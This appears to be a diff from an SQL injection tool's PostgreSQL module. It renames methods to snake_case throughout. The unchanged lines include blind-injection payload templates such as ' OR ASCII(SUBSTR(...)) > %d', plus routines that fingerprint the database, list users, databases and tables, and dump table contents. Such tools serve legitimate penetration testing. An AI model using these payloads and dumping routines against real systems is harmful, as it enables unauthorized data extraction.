@@ -42,7 +42,7 @@ class PostgreSQLMap(Common):
 
         return expression
 
-    def createStm(self):
+    def create_stm(self):
         if self.args.injectionMethod == "numeric":
             evilStm = " OR ASCII(SUBSTR((%s), %d, %d)) > %d"
         elif self.args.injectionMethod == "stringsingle":
@@ -52,7 +52,7 @@ class PostgreSQLMap(Common):
 
         return evilStm
 
-    def createExactStm(self):
+    def create_exact_stm(self):
         if self.args.injectionMethod == "numeric":
             evilStm = " OR SUBSTR((%s), %d, %d) = '%s' AND 1=1"
         elif self.args.injectionMethod == "stringsingle":
@@ -62,24 +62,24 @@ class PostgreSQLMap(Common):
 
         return evilStm
 
-    def getFingerprint(self):
+    def get_fingerprint(self):
         if not self.args.exaustiveFp:
             return "PostgreSQL"
 
-        actVer = self.parseFp("PostgreSQL", self.__fingerprint)
+        actVer = self.parse_fp("PostgreSQL", self.__fingerprint)
         value = "active fingerprint: %s" % actVer
 
         if self.__banner:
             banVer = re.search("^PostgreSQL ([\d\.]+)", self.__banner)
             banVer = banVer.groups()[0]
-            banVer = self.parseFp("PostgreSQL", [banVer])
+            banVer = self.parse_fp("PostgreSQL", [banVer])
 
             blank = " " * 16
             value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)
 
         return value
 
-    def getBanner(self):
+    def get_banner(self):
         logMsg = "fetching banner"
         self.log(logMsg)
 
@@ -88,13 +88,13 @@ class PostgreSQLMap(Common):
 
         return self.__banner
 
-    def getCurrentUser(self):
+    def get_current_user(self):
         logMsg = "fetching current user"
         self.log(logMsg)
 
         return self.get_value("CURRENT_USER")
 
-    def getCurrentDb(self):
+    def get_current_db(self):
         logMsg = "fetching current database"
         self.log(logMsg)
 
@@ -103,7 +103,7 @@ class PostgreSQLMap(Common):
         else:
             return self.get_value("CURRENT_DATABASE()")
 
-    def getUsers(self):
+    def get_users(self):
         logMsg = "fetching number of database users"
         self.log(logMsg)
 
@@ -132,7 +132,7 @@ class PostgreSQLMap(Common):
 
         return users
 
-    def getDbs(self):
+    def get_dbs(self):
         logMsg = "fetching number of databases"
         self.log(logMsg)
 
@@ -164,7 +164,7 @@ class PostgreSQLMap(Common):
 
         return dbs
 
-    def getTables(self):
+    def get_tables(self):
         if self.args.db and self.args.db != "public":
             self.args.db = "public"
 
@@ -191,7 +191,7 @@ class PostgreSQLMap(Common):
         logMsg = "fetching tables for database '%s'" % self.args.db
         self.log(logMsg)
 
-        dbTables = {}
+        db_tables = {}
         tables = []
 
         for index in range(int(count)):
@@ -203,17 +203,17 @@ class PostgreSQLMap(Common):
             tables.append(table)
 
         if tables:
-            dbTables[self.args.db] = tables
+            db_tables[self.args.db] = tables
         else:
             errMsg = "unable to retrieve the tables "
             errMsg += "for database '%s'" % self.args.db
             raise Exception(errMsg)
 
-        self.__cachedTables = dbTables
+        self.__cachedTables = db_tables
 
-        return dbTables
+        return db_tables
 
-    def getColumns(self):
+    def get_columns(self):
         if not self.args.tbl:
             errMsg = "missing table parameter"
             raise Exception(errMsg)
@@ -288,7 +288,7 @@ class PostgreSQLMap(Common):
 
         return tableColumns
 
-    def dumpTable(self):
+    def dump_table(self):
         if not self.args.tbl:
             raise Exception("missing table parameter")
 
@@ -301,7 +301,7 @@ class PostgreSQLMap(Common):
             self.warn(warnMsg)
 
         if not self.__cachedColumns:
-            self.__cachedColumns = self.getColumns()
+            self.__cachedColumns = self.get_columns()
 
         logMsg = "fetching number of entries for table "
         logMsg += "'%s' on current database" % self.args.tbl
@@ -373,17 +373,17 @@ class PostgreSQLMap(Common):
 
         return columnValues
 
-    def getFile(self, filename):
+    def get_file(self, filename):
         errMsg = "PostgreSQL module does not support file reading"
         raise Exception(errMsg)
 
-    def getExpr(self, expression):
-        if self.args.unionUse:
-            return self.unionUse(expression)
+    def get_expr(self, expression):
+        if self.args.union_use:
+            return self.union_use(expression)
         else:
             return self.get_value(expression)
 
-    def checkDbms(self):
+    def check_dbms(self):
         logMsg = "testing PostgreSQL"
         self.log(logMsg)
 
@@ -432,7 +432,7 @@ class PostgreSQLMap(Common):
             else:
                 self.__fingerprint = ["< 6.2.0"]
 
-            if self.args.getBanner:
+            if self.args.get_banner:
                 self.__banner = self.get_value("VERSION()")
 
             return True
